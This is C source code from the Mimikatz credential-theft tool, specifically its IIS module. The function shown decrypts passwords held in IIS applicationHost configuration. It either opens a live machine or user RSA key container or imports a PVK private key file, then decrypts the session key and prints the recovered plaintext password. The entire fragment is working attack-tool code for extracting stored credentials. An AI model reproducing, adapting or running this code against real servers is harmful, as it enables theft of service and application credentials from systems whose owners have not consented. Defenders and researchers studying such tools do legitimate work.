void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData)
{
	BOOL isLive;
	PBYTE liveData;
	DWORD szLiveData, szPvk;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey = 0, hSessionKey;
	PPVK_FILE_HDR pvk = NULL;
	PCWSTR pvkName = NULL;

	isLive = kull_m_string_args_byName(argc, argv, L"live", NULL, NULL);
	if(!kull_m_string_args_byName(argc, argv, keyContainerName, &pvkName, NULL))
		kull_m_string_args_byName(argc, argv, L"pvk", &pvkName, NULL);

	if(isLive || pvkName)
	{
		if(liveData = (PBYTE) LocalAlloc(LPTR, szData))
		{
			RtlCopyMemory(liveData, data, szData);
			szLiveData = szData;
			if(isLive)
				kprintf(L"  | Live Key  : %s - %s : ", keyContainerName, isMachine ? L"machine" : L"user");
			if(CryptAcquireContext(&hProv, isLive ? keyContainerName : NULL, (MIMIKATZ_NT_BUILD_NUMBER <= KULL_M_WIN_BUILD_XP) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV , PROV_RSA_AES, (isLive ? 0 : CRYPT_VERIFYCONTEXT) | (isMachine ? CRYPT_MACHINE_KEYSET : 0)))
			{
				if(isLive)
					kprintf(L"OK\n");
				else
				{

					if(kull_m_file_readData(pvkName, (PBYTE *) &pvk, &szPvk))
					{
						kprintf(L"  | PVK file  : %s - \'%s\' : ", keyContainerName, pvkName);
						if(CryptImportKey(hProv, (PBYTE) pvk + sizeof(PVK_FILE_HDR), pvk->cbPvk, 0, 0, &hKey))
							kprintf(L"OK\n");
						else PRINT_ERROR_AUTO(L"CryptImportKey (RSA)");
					}
				}
				if(isLive || hKey)
				{
					if(CryptImportKey(hProv, sessionKey, szSessionKey, hKey, 0, &hSessionKey))
					{
						if(CryptDecrypt(hSessionKey, 0, FALSE, 0, liveData, &szLiveData))
						{
							kprintf(L"  | Password  : %s\n", liveData + sizeof(DWORD) /*CRC32 ? Random ?*/);
						}
						else PRINT_ERROR_AUTO(L"CryptDecrypt");
						CryptDestroyKey(hSessionKey);
					}
					else PRINT_ERROR_AUTO(L"CryptImportKey (session)");
				}
				if(!isLive)
				{
					if(hKey)
						CryptDestroyKey(hKey);
					if(pvk)
						LocalFree(pvk);
				}
				CryptReleaseContext(hProv, 0);
			}
			else PRINT_ERROR_AUTO(L"CryptAcquireContext");
			LocalFree(liveData);
		}
	}
}